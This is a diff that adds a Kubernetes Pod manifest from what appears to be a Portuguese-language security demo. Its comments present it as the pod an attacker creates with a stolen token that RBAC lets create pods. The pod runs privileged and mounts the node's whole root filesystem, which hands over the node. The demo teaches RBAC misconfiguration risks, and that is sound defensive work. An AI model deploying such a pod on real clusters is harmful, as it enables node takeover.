@@ -1,0 +1,22 @@
+# Cavaleiro 2 — o pod que o ATACANTE cria usando o token roubado.
+# Privilegiado e montando o filesystem do node. Voce nunca escreveu isto:
+# o RBAC permitiu que o token criasse pods, e o atacante criou este.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-do-atacante
+  namespace: c2-privileged
+  labels: { demo: cavaleiro-2-ataque }
+spec:
+  containers:
+    - name: x
+      image: alpine:3.20
+      imagePullPolicy: IfNotPresent
+      command: ["sh", "-c", "sleep infinity"]
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - { name: host, mountPath: /host }
+  volumes:
+    - name: host
+      hostPath: { path: /, type: Directory }
